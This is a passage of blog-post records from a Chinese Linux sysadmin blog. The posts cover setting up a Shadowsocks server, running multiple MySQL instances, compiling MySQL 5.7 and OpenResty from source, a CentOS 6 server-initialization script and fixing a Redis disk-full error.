python-pip","text":"前言：作为一名IT技术狗，在日常工作学习中，难免会经常使用搜索引擎来搜索技术问题，而众所周知的是百度在技术搜索上就是个笑话，想要快速找到答案还是得靠Google，但是因为某些不可描述的原因，在国内想通过正规途径来访问Google完全是不可能的。那么问题来了，如何通过一些技术小手段来正常访问Google呢？一般来说，常见的方法是通过国外线路的VPN来访问，然而这种情况下有一些使用上的不便。比如说：很多时候在解决问题的时候我们会有这样的需求，一边使用VPN线路通过Google来搜索技术问题同时还需要通过QQ等即时通信软件与同事朋友交流沟通，此时因为我们通过VPN线路来上网，那么就会出现QQ异地登录警告，严重时腾讯会直接将QQ冻结。所以，对于日常工作来说，我认为VPN太重，我们需要一个轻量级的工具仅需能够代理浏览器的请求即可，那么这时shadowsocks就是最好的选择了。 1.安装python-pipPip是安装Python包的工具，提供了安装、列举已安装包、升级以及卸载包的功能。Pip 是对easy_install的取代，提供了和easy_install相同的查找包的功能，因此可以使用easy_install安装的包也同样可以使用pip进行安装。目前有很多Python程序都是可以直接通过Pip来一键安装了，比如众所周知的Django、Markdown、Shadowsocks等。1# yum install -y python-pip 2.通过pip安装shadowsocks123456789101112# pip install shadowsocks/usr/lib/python2.6/site-packages/pip/_vendor/requests/packages/urllib3/util/ssl_.py:90: InsecurePlatformWarning: A true SSLContext object is not available. This prevents urllib3 from configuring SSL appropriately and may cause certain SSL connections to fail. For more information, see https://urllib3.readthedocs.org/en/latest/security.html#insecureplatformwarning. InsecurePlatformWarningYou are using pip version 7.1.0, however version 8.1.2 is available.You should consider upgrading via the 'pip install --upgrade pip' command.Collecting shadowsocks/usr/lib/python2.6/site-packages/pip/_vendor/requests/packages/urllib3/util/ssl_.py:90: InsecurePlatformWarning: A true SSLContext object is not available. This prevents urllib3 from configuring SSL appropriately and may cause certain SSL connections to fail. For more information, see https://urllib3.readthedocs.org/en/latest/security.html#insecureplatformwarning. InsecurePlatformWarning Downloading shadowsocks-2.8.2.tar.gzInstalling collected packages: shadowsocks Running setup.py install for shadowsocksSuccessfully installed shadowsocks-2.8.2 3.创建shadowsocks配置文件shadowsocks安装完成后默认是没有配置文件的，这时候就需要我们自己来创建配置文件，配置文件为json格式，很简单。12345678910111213# vim /etc/shadowsocks.json&#123; \"server\":\"your_server_ip\", \"server_port\":8989, \"local_address\": \"127.0.0.1\", #这一行可不写 \"local_port\":1080, \"password\":\"yourpassword\", \"timeout\":600, \"method\":\"aes-256-cfb\", \"fast_open\": false, #这一行可不写 \"workers\": 1 #这一行可不写&#125; 配置文件各字段含义：各字段的含义：server：服务器 IP (IPv4/IPv6)，注意这也将是服务端监听的 IP 地址server_port：监听的服务器端口local_address：本地监听的 IP 地址local_port：本地端端口password：用来加密的密码timeout：超时时间（秒）method：加密方法，可选择 “bf-cfb”, “aes-256-cfb”, “des-cfb”, “rc4”, 等等。默认是一种不安全的加密，推荐用 “aes-256-cfb”fast_open : true 或 false。如果你的服务器 Linux 内核在3.7+，可以开启 fast_open 以降低延迟。开启方法：1# echo 3 &gt; /proc/sys/net/ipv4/tcp_fastopen 开启之后，将 fast_open 的配置设置为 true 即可。works : works数量，默认为 1这一段参考：https://teddysun.com/339.html 4.服务器端启动shadowsocks在服务器端启动shadowsocks有很多方法，此处我们使用的是指定配置文件启动。1# ssserver -c /etc/shadowsocks.json 但这种启动方式将一直启动在当前会话，所以，我们要将其放入后台启动，同时还可以指定记录日志。1# nohup ssserver -c /etc/shadowsocks.json 2&gt; /var/log/shaowsocks.log &amp; 将启动命令写入/etc/rc.local设置为开机启动1echo \"nohup ssserver -c /etc/shadowsocks.json 2&gt; /var/log/shaowsocks.log &amp;\" &gt;&gt; /etc/rc.local 查看端口是否监听，判断服务是否正常启动1234# netstat -nultpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:8989 0.0.0.0:* LISTEN 31593/python 如果端口没有监听，那么一定是启动过程中出错了，直接根据报错提示排错，我在配置过程中也出了一次错误。12345# ssserver -c /etc/shadowsocks.jsonINFO: loading config from /etc/shadowsocks.json/usr/lib/python2.6/site-packages/shadowsocks/shell.py:154: DeprecationWarning: BaseException.message has been deprecated as of Python 2.6 e.message)ERROR: found an error in config.json: Expecting property name: line 9 column 1 (char 189) 其实这个错误提示很明显，配置文件第9行出错，检查了下shadowsocks.json发现，第9行多写了一个”,” 5.添加防火墙规则1# iptables -I INPUT -p tcp --dport 8489 -j ACCEPT 至此，服务器端的 Shadowsocks 安装和配置完毕。 6.shadowsocks客户端配置shadowsocks客户端配置非常简单，自行百度即可。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"}],"tags":[{"name":"Centos","slug":"Centos","permalink":"http://blog.unixmen.cn/tags/Centos/"},{"name":"shadowsocks","slug":"shadowsocks","permalink":"http://blog.unixmen.cn/tags/shadowsocks/"},{"name":"科学上网","slug":"科学上网","permalink":"http://blog.unixmen.cn/tags/科学上网/"}]},{"title":"MySQL 5.6单机多实例配置","slug":"MySQL 5.6+单机多实例","date":"2016-09-27T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/09/28/MySQL 5.6+单机多实例/","link":"","permalink":"http://blog.unixmen.cn/2016/09/28/MySQL 5.6+单机多实例/","excerpt":"\n前言：因为所在公司是小公司，经费有限，所以线下测试服务器数量不足。一直以来，开发与测试都是公用一套MySQL环境，然而由于开发与数据对于MySQL数据的需求不完全一致，导致日常工作中经常出现数据干扰，影响工作。因此，为了提高工作效率，决定将开发与测试的MySQL环境分离，然而当前手上只有一台服务器，条件有限，所以只能部署MySQL单机多实例。MySQL服务器环境：Centos 7.1 + MySQL 5.6.24\n\n\n创建数据目录\n\n\n1# mkdir -p /data/mysql /data/mysql2\n\n初始化数据库\n\n\n12# scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/data/mysql --user=mysql# scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/data/mysql2 --user=mysql\n\n生成MySQL多实例配置文件\n\n\n12# mysqld_multi --example &gt; /data/multi.cnf# chown mysql.mysql multi.cnf\n此处，我们采用的MySQL的官方解决方案mysqld_multi来实现。","text":"前言：因为所在公司是小公司，经费有限，所以线下测试服务器数量不足。一直以来，开发与测试都是公用一套MySQL环境，然而由于开发与数据对于MySQL数据的需求不完全一致，导致日常工作中经常出现数据干扰，影响工作。因此，为了提高工作效率，决定将开发与测试的MySQL环境分离，然而当前手上只有一台服务器，条件有限，所以只能部署MySQL单机多实例。MySQL服务器环境：Centos 7.1 + MySQL 5.6.24 创建数据目录 1# mkdir -p /data/mysql /data/mysql2 初始化数据库 12# scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/data/mysql --user=mysql# scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/data/mysql2 --user=mysql 生成MySQL多实例配置文件 12# mysqld_multi --example &gt; /data/multi.cnf# chown mysql.mysql multi.cnf 此处，我们采用的MySQL的官方解决方案mysqld_multi来实现。 配置MySQL多实例配置文件 12345678910111213141516171819202122232425262728293031323334353637383940# vim multi.cnf[mysqld_multi]mysqld = /usr/local/mysql/bin/mysqld_safemysqladmin = /usr/local/mysql/bin/mysqladminuser = multi_adminpassword = password#这个用户应该有关机权限，然后没有其他的权限。建议创建一个通用的multi_admin用户控制其它的MySQL用户，例如#GRANT SHUTDOWN ON *.* TO multi_admin@localhost IDENTIFIED BY 'password'[mysqld1]character_set_server =utf8socket = /tmp/mysql.sock1port = 3306pid-file = /data/mysql/hostname.pid1datadir = /data/mysqllog-error = /data/mysql/log/mysql_run.err#language = /usr/local/mysql/share/mysql/english#user = mysqlslow_query_log=1long_query_time=2max_connections = 3000log_bin_trust_function_creators=1[mysqld2]character_set_server =utf8socket = /tmp/mysql.sock2port = 3307pid-file = /data/mysql2/hostname.pid2datadir = /data/mysql2log-error = /data/mysql2/log/mysql_run.err#language = /usr/local/mysql/share/mysql/english#user = mysqlslow_query_log=1long_query_time=2max_connections = 3000#log_bin_trust_function_creators=1 启动、关闭MySQL数据库多实例 1234567891011# mysqld_multi --defaults-file=/data/multi.cnf start 1,2启动时需指定multi.cnf配置文件。如果只需要启动实例mysqld1，仅需# mysqld_multi --defaults-file=/data/multi.cnf start 1关闭多个实例# /usr/local/mysql/bin/mysqld_multi --defaults-extra-file=/data/multi.cnf --user=mysql_admin --password=password stop 1,2关闭单个实例# /usr/local/mysql/bin/mysqld_multi --defaults-extra-file=/data/multi.cnf --user=mysql_admin --password=password stop 1 配置管理脚本 为了管理方便，写一个简单的管理脚本。123456789101112131415161718192021222324252627282930313233343536# vim /etc/init.d/mysql_multi#!/bin/bash#basedir=/usr/local/mysqlbindir=/usr/local/mysql/binconf=/data/multi.cnfuser=multi_adminpassword=passwordexport PATH=$bindir:/$PATHif test -x $bindir/mysqld_multithen mysqld_multi=\"$bindir/mysqld_multi\";else echo \"Can't execute $bindir/mysqld_multi from dir $basedir\"; exit;ficase \"$1\" in 'start' ) \"$mysqld_multi\" --defaults-extra-file=$conf --user=$user --password=$password start $2 ;; 'stop' ) \"$mysqld_multi\" --defaults-extra-file=$conf --user=$user --password=$password stop $2 ;; 'report' ) \"$mysqld_multi\" --defaults-extra-file=$conf --user=$user --password=$password report $2 ;; 'restart' ) \"$mysqld_multi\" --defaults-extra-file=$conf --user=$user --password=$password stop $2 \"$mysqld_multi\" --defaults-extra-file=$conf --user=$user --password=$password start $2 ;; *) echo \"Usage: $0 &#123;start|stop|report|restart&#125;\" &gt;&amp;2 ;;esac 多实例MySQL登录 因为我们配置了多实例，在配置文件中指定了不同的sock文件，因此在服务器本地登录MySQL时需要指定sock文件。12# mysql -uroot -p -S /tmp/mysql.sock1# mysql -uroot -p -S /tmp/mysql.sock2","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"MySQL","slug":"Linux/MySQL","permalink":"http://blog.unixmen.cn/categories/Linux/MySQL/"}],"tags":[{"name":"MySQL5.6","slug":"MySQL5-6","permalink":"http://blog.unixmen.cn/tags/MySQL5-6/"},{"name":"单机多实例","slug":"单机多实例","permalink":"http://blog.unixmen.cn/tags/单机多实例/"}]},{"title":"MySQL 5.7源码编译安装几处变化","slug":"MySQL 5.7+源码编译变化","date":"2016-09-26T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/09/27/MySQL 5.7+源码编译变化/","link":"","permalink":"http://blog.unixmen.cn/2016/09/27/MySQL 5.7+源码编译变化/","excerpt":"\n前言：因为之前blog一直放在朋友的vps上，一来管理不便，二来也麻烦人。于是，花了点小钱在XX主机买了一个香港VPS，然后就准备开始部署blog环境。部署MySQL的时候，想尝尝鲜，就下载了最新的MySQL5.7.15源码编译安装，在编译安装的过程中踩了不少坑。究其主要原因，还是因为MySQL5.7相对于前面的版本做了一些小改动，在编译安装的过程中有一些变化，在此就将我遇到的坑整理出来与大家分享分享。\n\nCMAKE版本在MySQL的源码编译安装过程中需要使用cmake来安装，而在MySQL5.7的编译安装过程中要求cmake版本最低为2.8，如果版本低于2.8则需要升级cmake版本。\n查询版本命令：123# cmake --versioncmake version 3.6.2CMake suite maintained and supported by Kitware (kitware.com/cmake)\n升级cmake有两种方法，可以直接使用yum工具来升级，也可以直接去cmake官网下载源码包然后编译安装。目前常见yum源中的cmake版本都在2.8.X，这里就不细说了，简单说下如何编译安装cmake。1234567# wget https://cmake.org/files/v3.6/cmake-3.6.2.tar.gz# tar zxvf cmake-3.6.2.tar.gz# cd cmake-3.6.2# ./bootstrap# make &amp;&amp; make install# cmake --versioncmake version 3.6.2\n如果上述编译安装过程中报错，先检查是否安装gcc库。","text":"前言：因为之前blog一直放在朋友的vps上，一来管理不便，二来也麻烦人。于是，花了点小钱在XX主机买了一个香港VPS，然后就准备开始部署blog环境。部署MySQL的时候，想尝尝鲜，就下载了最新的MySQL5.7.15源码编译安装，在编译安装的过程中踩了不少坑。究其主要原因，还是因为MySQL5.7相对于前面的版本做了一些小改动，在编译安装的过程中有一些变化，在此就将我遇到的坑整理出来与大家分享分享。 CMAKE版本在MySQL的源码编译安装过程中需要使用cmake来安装，而在MySQL5.7的编译安装过程中要求cmake版本最低为2.8，如果版本低于2.8则需要升级cmake版本。 查询版本命令：123# cmake --versioncmake version 3.6.2CMake suite maintained and supported by Kitware (kitware.com/cmake) 升级cmake有两种方法，可以直接使用yum工具来升级，也可以直接去cmake官网下载源码包然后编译安装。目前常见yum源中的cmake版本都在2.8.X，这里就不细说了，简单说下如何编译安装cmake。1234567# wget https://cmake.org/files/v3.6/cmake-3.6.2.tar.gz# tar zxvf cmake-3.6.2.tar.gz# cd cmake-3.6.2# ./bootstrap# make &amp;&amp; make install# cmake --versioncmake version 3.6.2 如果上述编译安装过程中报错，先检查是否安装gcc库。 Boost库支持MySQL5.7的编译安装过程需要boost类库支持，可以直接在CMAKE编译参数中指定下载，也可以下载到指定目录，然后在CMAKE编译参数中指定boost位置。 CMAKE编译参数中指定下载123# cmake ............ -DDOWNLOAD_BOOST=1\\ #指定是否下载boost -DWITH_BOOST=/usr/local/boost #指定boost位置 不过依据我多次编译MySQL5.7的经验，在CMAKE编译参数中指定下载boost会因为网络原因出现错误，最好还是直接下载到服务器，然后编译安装时指定目录。 直接下载boost到服务器并在编译安装时指定目录123# wget -o /usr/local/boost/boost_1_59_0.tar.gz http://ncu.dl.sourceforge.net/project/boost/boost/1.59.0/boost_1_59_0.tar.gz# cmake ............ -DWITH_BOOST=/usr/local/boost #指定boost位置 此处下载完成后无需解压，MySQL在CMAKE编译配置时会自动解压。 MySQL初始化数据库MySQL5.7跟以前版本的MySQL在编译安装过程中最大的变化还是初始化数据库不再使用scripts/mysql_install_db脚本来实现，而是直接使用bin/mysqld指定–initialize参数来实现。1# bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql/ --datadir=/usr/local/mysql/data/ MySQL5.7数据库初始密码在MySQL5.7版本以前，编译安装完成MySQL后，首次登录无需密码，而在MySQL5.7中，在编译安装完成，初始化MySQL数据库时会生成一个随机密码，首次登录需使用随机密码。12345# bin/mysqld --initialize --user=mysql --basedir=/usr/local/mysql/ --datadir=/usr/local/mysql/data/2016-09-27T08:45:57.023651Z 1 [Note] A temporary password is generated for root@localhost: dh9&gt;qmyaBIZe修改root密码# mysqladmin -uroot password 'password' -p'dh9&gt;qmyaBIZe' 大体上，MySQL5.7与以前版本的在编译安装过程中就这几处变化，其他的与之前版本的编译安装过程无异，仅供参考，如有不同意见，欢迎补充。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"MySQL","slug":"Linux/MySQL","permalink":"http://blog.unixmen.cn/categories/Linux/MySQL/"}],"tags":[{"name":"MySQL5.7","slug":"MySQL5-7","permalink":"http://blog.unixmen.cn/tags/MySQL5-7/"},{"name":"源码编译变化","slug":"源码编译变化","permalink":"http://blog.unixmen.cn/tags/源码编译变化/"}]},{"title":"Centos6 系统初始化脚本","slug":"Centos6+init","date":"2016-09-21T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/09/22/Centos6+init/","link":"","permalink":"http://blog.unixmen.cn/2016/09/22/Centos6+init/","excerpt":"最近，因为业务需要，一下上架了27台服务器，这些服务器在交付之前，都要进行基础的系统初始化，如：修改密码、修改ssh端口、修改主机名、常见工具安装、yum源本地化、内核参数优化等。如果一台一台的手动操作，难免效率太低，所以偷了个懒，写了个小脚本来自动执行，废话少说，脚本内容如下：","text":"最近，因为业务需要，一下上架了27台服务器，这些服务器在交付之前，都要进行基础的系统初始化，如：修改密码、修改ssh端口、修改主机名、常见工具安装、yum源本地化、内核参数优化等。如果一台一台的手动操作，难免效率太低，所以偷了个懒，写了个小脚本来自动执行，废话少说，脚本内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#!/bin/bash##by:wanglei#date:20160823#version:1.0source /etc/profilecat &lt;&lt; EOF++++++++++++++++++++++++++++++++++++++++++++++++ ++ Start system initialization ++ ++++++++++++++++++++++++++++++++++++++++++++++++EOF###修改主机名###echo \"===开始修改主机名.===\" |tee -a init.logecho -e \"\\033[31m请选择是否修改主机名.\\033[0m\"echo \" 1: change hostname\"echo \" 2: not change\"echo \" Any other character (except 1,2) exits\"read -p \"Select Options (1 or 2): \" optionif [[ \"$option\" == \"1\" ]]; then read -p \"Please input a new hostname: \" hostName sed -i 's/^HOSTNAME=.*/HOSTNAME='$hostName'/g' /etc/sysconfig/network hostname $hostName echo -e \"new hostname is \\033[31m$hostName\\033[0m \"elif [[ \"$option\" == \"2\" ]]; then exitelse echo -e \"\\033[31mUnknown Options.\\033[0m\" exitfiecho \"===主机名修改完成===\" | tee -a init.log###修改DNS服务器###echo \"===开始修改DNS服务器.===\" |tee -a init.logecho -e \"nameserver 223.5.5.5\\nnameserver 8.8.8.8\" &gt; /etc/resolv.confecho \"===DNS服务器修改完成.===\" | tee -a init.log###安装wget工具###echo \"===开始安装wget工具.===\" |tee -a init.logyum install -y wget &amp;&amp; echo -e \"\\033[31mwget安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mwget安装失败.\\033[0m\" |tee -a init.logecho \"===wget工具安装完成.===\" |tee -a init.log###安装YUM源###echo \"===开始安装epel源.===\" |tee -a init.logosVersion=$(cat /etc/redhat-release | awk -F. '&#123;print $1&#125;' | awk '&#123;print $NF&#125;')if [[ \"$osVersion\" -lt 7 ]]; then wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo &amp;&amp; echo -e \"\\033[31mepel源安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mepel源安装失败.\\033[0m\" |tee -a init.logelse wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo &amp;&amp; echo -e \"\\033[31mepel源安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mepel源安装失败.\\033[0m\" |tee -a init.logfiyum makecacheecho \"===epel源安装完成.===\" | tee -a init.log###升级系统yum update###echo \"===开始升级系统.===\" |tee -a init.logyum -y update &amp;&amp; echo -e \"\\033[31m系统升级成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32m系统升级失败.\\033[0m\" |tee -a init.logecho \"===升级系统完成.===\" |tee -a init.log###安装常用工具软件###echo \"===开始安装常用软件.===\" |tee -a init.logyum install -y glances &amp;&amp; echo -e \"\\033[31mglances安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mglances安装失败.\\033[0m\" |tee -a init.logyum install -y vim &amp;&amp; echo -e \"\\033[31mvim安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mvim安装失败.\\033[0m\" |tee -a init.logyum install -y iftop &amp;&amp; echo -e \"\\033[31miftop安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32miftop安装失败.\\033[0m\" |tee -a init.logyum install -y ntp &amp;&amp; echo -e \"\\033[31mntp安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mntp安装失败.\\033[0m\" |tee -a init.logyum install -y openssh* &amp;&amp; echo -e \"\\033[31mopenssh安装成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mopenssh安装失败.\\033[0m\" |tee -a init.logecho \"===常用软件安装完成.===\" |tee -a init.log###关闭selinux###echo \"===开始关闭SELINUX.===\" |tee -a init.logsed -i \"s/SELINUX=enforcing/#SELINUX=enforcing\\nSELINUX=disabled/g\" /etc/selinux/configsetenforce 0echo \"===SELINUX已关闭完成.===\" |tee -a init.log###修改SSH配置###echo \"===开始修改SSH配置.===\" |tee -a init.logcp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak-$(date +%Y%m%d%H%M)read -p \"Please input a new portnumber: \" portNumbersed -i \"s/#Port 22/#Port 22\\nPort $portNumber/g\" /etc/ssh/sshd_configsed -i 's/#UseDNS yes/#UseDNS yes\\nUseDNS no/g' /etc/ssh/sshd_configecho -e \"new portnumber is \\033[31m$portNumber\\033[0m .\" | tee -a init.logiptables -I INPUT -p tcp --dport $portNumber -j ACCEPTservice iptables saveecho \"===SSH配置修改完成.===\" |tee -a init.log###修改root密码###echo \"===开始修改root用户密码.===\" |tee -a init.logread -p \"Please input new password: \" passWordecho $passWord | passwd --stdin rootecho \"===root密码修改完成.===\" |tee -a init.log###修改文件句柄限制###echo \"===开始修改文件句柄限制.===\" |tee -a init.logcat &gt;&gt; /etc/security/limits.conf &lt;&lt;EOF * soft nproc 327675* hard nproc 327675* soft nofile 327675* hard nofile 327675EOFecho \"ulimit -SH 327675\" &gt;&gt; /etc/rc.localecho \"===文件句柄限制修改完成.===\" |tee -a init.log###内核参数优化###echo \"===开始内核参数优化.===\" |tee -a init.logcat &gt;&gt; /etc/sysctl.conf &lt;&lt;EOFfs.file-max = 327675net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_rmem = 4096 87380 8388608net.ipv4.tcp_wmem = 4096 87380 8388608net.core.rmem_max = 16777216net.core.wmem_max = 16777216net.ipv4.tcp_window_scaling = 1net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_tw_recycle = 1net.core.netdev_max_backlog = 262144net.ipv4.tcp_max_orphans = 262144net.ipv4.tcp_max_syn_backlog = 4096net.ipv4.tcp_timestamps = 0net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2net.ipv4.tcp_keepalive_time = 30net.ipv4.tcp_mem = 94500000 915000000 927000000EOFsysctl -pecho \"===内核参数优化完成.===\" |tee -a init.log###同步系统时间###echo \"===开始同步系统时间.===\" |tee -a init.logrm -rf /etc/localtime cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtimentpdate 2.cn.pool.ntp.org &amp;&amp; echo -e \"\\033[31m同步系统时间成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32m同步系统时间失败.\\033[0m\" |tee -a init.loghwclock --systohcecho \"===系统时间同步完成.===\" |tee -a init.log###重启SSH服务###echo \"===开始重启SSH服务.===\" |tee -a init.log/etc/init.d/sshd restart &amp;&amp; echo -e \"\\033[31mSSH服务重启成功.\\033[0m\" |tee -a init.log || echo -e \"\\033[32mSSH服务重启失败.\\033[0m\" |tee -a init.logecho \"===SSH服务重启完成.===\" |tee -a init.log###输出初始化日志###echo -e \"===\\033[31m系统初始化完成，日志如下:\\033[0m \\n===\"cat init.log 因为工作实际需要，脚本做成了交互式，在以后的工作中，可以考虑定义一个单独的变量文件，然后结合saltstack工具，实现服务器批量自动初始化。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"}],"tags":[{"name":"Centos6","slug":"Centos6","permalink":"http://blog.unixmen.cn/tags/Centos6/"},{"name":"系统初始化","slug":"系统初始化","permalink":"http://blog.unixmen.cn/tags/系统初始化/"},{"name":"脚本","slug":"脚本","permalink":"http://blog.unixmen.cn/tags/脚本/"}]},{"title":"Redis报错：Redis Is Configured to Save RDB Snapshots","slug":"Redis报错：Redis is configured to save RDB snapshots","date":"2016-08-25T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/08/26/Redis报错：Redis is configured to save RDB snapshots/","link":"","permalink":"http://blog.unixmen.cn/2016/08/26/Redis报错：Redis is configured to save RDB snapshots/","excerpt":"上午刚上班没一会，测试的兄弟找过来内网的redis服务连不上了，web访问redis的时候报错：\n\n-MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error. \n\n赶紧登录服务器检查；端口监听正常，进程正常，在服务器上使用redis-cli客户端进入redis，使用命令1127.0.0.1:6379&gt; keys *\n顺利得到结果，说明redis服务是正常的，那么为毛web端无法连接呢？赶紧查查redis日志，but，找了半天没发现redis日志在哪，翻了下配置文件，那一刻我震惊了！12logfile &quot;&quot;你特么是在逗我!!\n不知道之前是哪位“大神”配置的，居然没有指定日志文件路径，我勒个擦擦！好吧，那让我再仔细瞅瞅这个报错吧。以我英语四级差一点就过了的水准，仔细瞅了瞅这一大串英文字母，貌似是在说redis不能在硬盘上持久化，那一刻瞬间灵光一闪：\n\n这特么不会又是磁盘空间满了吧？（我为什么要说又呢）\n","text":"上午刚上班没一会，测试的兄弟找过来内网的redis服务连不上了，web访问redis的时候报错： -MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error. 赶紧登录服务器检查；端口监听正常，进程正常，在服务器上使用redis-cli客户端进入redis，使用命令1127.0.0.1:6379&gt; keys * 顺利得到结果，说明redis服务是正常的，那么为毛web端无法连接呢？赶紧查查redis日志，but，找了半天没发现redis日志在哪，翻了下配置文件，那一刻我震惊了！12logfile &quot;&quot;你特么是在逗我!! 不知道之前是哪位“大神”配置的，居然没有指定日志文件路径，我勒个擦擦！好吧，那让我再仔细瞅瞅这个报错吧。以我英语四级差一点就过了的水准，仔细瞅了瞅这一大串英文字母，貌似是在说redis不能在硬盘上持久化，那一刻瞬间灵光一闪： 这特么不会又是磁盘空间满了吧？（我为什么要说又呢） 赶紧祭出神器：1# df -hl 看看结果，果然是磁盘满了，然后使用另一神器查询到底是哪个文件吃了熊心豹子胆，胆敢耗完整个磁盘空间，过程略过不表，但看结果： 妹的，一个zookeeper.out文件就把空间用完了，又是这帮开发干的，之前用kafka也是，日志能把整个硬盘空间占完，我也是无话可说，果断一条命令：1# echo '' &gt; zookeeper.out web端重新连接，一切正常，结果就是这么简单。之后，用Google搜索了一下报错信息，发现了很多不同的解答，但是没有与我的情况一致的，因此在这里提醒一下： 如果服务器上redis进程服务正常的情况下，客户端连接redis报错：-MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.请先检查下磁盘空间是否正常，很有可能是磁盘空间不够用哦，不过如果你的服务器磁盘空间有监控的话，应该是不难发现这个问题的。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"},{"name":"Redis","slug":"Linux/Redis","permalink":"http://blog.unixmen.cn/categories/Linux/Redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://blog.unixmen.cn/tags/redis/"},{"name":"故障报错","slug":"故障报错","permalink":"http://blog.unixmen.cn/tags/故障报错/"}]},{"title":"编译安装Openresty+php","slug":"openresty+php","date":"2016-08-24T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2016/08/25/openresty+php/","link":"","permalink":"http://blog.unixmen.cn/2016/08/25/openresty+php/","excerpt":" 1. 编译安装openresty 准备相关软件包12345# wget https://openresty.org/download/openresty-1.11.2.1.tar.gz# wget -P /root/soft/ ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz# wget -P /root/soft/ https://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz# wget -P /root/soft/ https://openresty.org/download/drizzle7-2011.07.21.tar.gz# wget -P /root/soft/ https://www.openssl.org/source/openssl-1.0.2j.tar.gz\n 解决依赖关系1# yum install -y gcc gcc-c++ perl-devel perl-ExtUtils-Embed openssl-devel postgresql-devel libxml2-devel libxslt-devel gd-devel GeoIP-devel\n 如果启用了–with-http_drizzle_module参数，则需要如下配置12345# tar xzvf drizzle7-2011.07.21.tar.gz# cd drizzle7-2011.07.21/# ./configure --without-server# make libdrizzle-1.0# make install-libdrizzle-1.0","text":"1. 编译安装openresty 准备相关软件包12345# wget https://openresty.org/download/openresty-1.11.2.1.tar.gz# wget -P /root/soft/ ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.38.tar.gz# wget -P /root/soft/ https://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.8/zlib-1.2.8.tar.gz# wget -P /root/soft/ https://openresty.org/download/drizzle7-2011.07.21.tar.gz# wget -P /root/soft/ https://www.openssl.org/source/openssl-1.0.2j.tar.gz 解决依赖关系1# yum install -y gcc gcc-c++ perl-devel perl-ExtUtils-Embed openssl-devel postgresql-devel libxml2-devel libxslt-devel gd-devel GeoIP-devel 如果启用了–with-http_drizzle_module参数，则需要如下配置12345# tar xzvf drizzle7-2011.07.21.tar.gz# cd drizzle7-2011.07.21/# ./configure --without-server# make libdrizzle-1.0# make install-libdrizzle-1.0 创建openresty运行用户12# groupadd www# useradd www -g www -s /sbin/nologin 编译前配置1# ./configure --user=www --group=www --with-http_iconv_module --with-http_drizzle_module --with-http_postgres_module --with-threads --with-file-aio --with-ipv6 --with-http_realip_module --with-http_addition_module --with-http_xslt_module --with-http_image_filter_module --with-http_geoip_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_gzip_static_module --with-http_auth_request_module --with-http_random_index_module --with-http_secure_link_module --with-http_stub_status_module --with-http_perl_module --with-http_ssl_module --with-zlib=/root/soft/zlib-1.2.8 --with-pcre=/root/soft/pcre-8.38 --with-openssl=/root/soft/openssl-1.0.2j 编译配置过程中如果出现如下错误 src/event/ngx_event_openssl.c: In function ‘ngx_ssl_connection_error’:src/event/ngx_event_openssl.c:2048: error: ‘SSL_R_NO_CIPHERS_PASSED’ undeclared (first use in this function)src/event/ngx_event_openssl.c:2048: error: (Each undeclared identifier is reported only oncesrc/event/ngx_event_openssl.c:2048: error: for each function it appears in.)gmake[2]: *** [objs/src/event/ngx_event_openssl.o] Error 1gmake[2]: Leaving directory `/root/soft/openresty-1.11.2.1/build/nginx-1.11.2’gmake[1]: *** 